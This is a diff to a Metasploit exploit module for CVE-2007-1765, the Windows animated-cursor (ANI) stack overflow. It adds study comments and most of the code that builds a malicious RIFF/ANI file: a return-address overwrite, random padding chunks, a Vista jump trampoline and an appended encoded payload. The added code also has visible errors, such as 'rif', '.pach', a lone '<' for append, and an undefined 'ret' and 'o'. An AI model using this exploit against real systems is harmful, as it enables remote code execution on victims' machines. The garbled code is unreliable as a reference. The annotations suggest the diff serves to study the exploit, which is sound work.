@@ -1,6 +1,11 @@
 ##
 # This module requires Metasploit: https://metasploit/download
 # Current source: https://github.com/rapid7/metasploit-framework
+#
+# GAO: https://nvd.nist.gov/vuln/detail/CVE-2007-1765
+# GAO: RIFF (Resource Interchange File Format):
+#      https://en.wikipedia.org/wiki/Resource_Interchange_File_Format
+# GAO: ANI (Animated Raster Image format); https://en.wikipedia.org/wiki/ANI_(file_format)
 ##
 
 class MetasploitModule < Msf::Exploit::Remote
@@ -226,6 +231,62 @@ class MetasploitModule < Msf::Exploit::Remote
       # Patch local variables and loop counters
       anih_b[64, 12] = [0].pack("V") * 3  # 32-bit unsigned, VAX (little-endian) byte order (.pack)
     end
+
+    # Overwrite the return with address of a "call ptr [ebx+4]"
+    # GAO: buffer overflow rewrite to call a malicious instruction set
+    anih_b << [target.ret].pack('V')[o, target['Len'] ? target['Len'] : 4]
+
+    # Begin ANI chunk
+    riff = "ACON"
+
+    # Calculate the data offset for the trampoline chunk and add
+    # the trampoline chunk if we're attacking Vista
+    if target.name =~ /Vista/
+      trampoline_doffset = riff.length + 8
+
+      rif << generate_trampoline_riff_chunk
+    end
+
+    # Insert random RIFF chunks
+    0.upto(rand(128)+16) do |i|
+      riff << generate_riff_chunk()
+    end
+
+    # Embed the first ANI header
+    riff << "anih" + [anih_a.length].pach('V') + anih_a
+
+    # Insert random RIFF chunks
+    0.upto(rand(128)+16) do|i|
+      riff << generate_riff_chunk()
+    end
+
+    # Trigger the return address overwrite GAO: (here's the juicy stuff)
+    # we're adding to riff hte payload contained in anih_b
+    riff < "anih" + [anih_b.length].pack('V') + anih_b
+
+    # If this is a Vista target, then we need to align the length of the
+    # RIFF chunk so that the low order two bytes are equal to a jmp $+0x16
+    if target.name =~ /Vista/
+      plen  = (riff.length & 0xffff0000) | 0x0eeb
+      plen += 0x10000 if (plen - 8) < riff.length
+
+      riff << generate_riff_chunk((plen - 8) - riff.length)
+
+      # Replace the operand to the relative jump to point into the actual
+      # payload itself which comess after the riff chun
+      riff[trampoline_doffset + 1, 4] = [riff.length - trampoline_doffset - 5].pack('V')
+    end
+
+    # We copy the encoded payload to the stack b/c sometimes the RIFF
+    # image is mapped in read-only pages. This would prevent in-place
+    # decoders from working, and we can't have that.
+    ret << Rex::Arch::X86.copy_to_stack(payload.encoded.length)
+
+    # Place the real payload right after it.
+    ret << payload.encoded
+
+    ret
+    
   end
 
   #
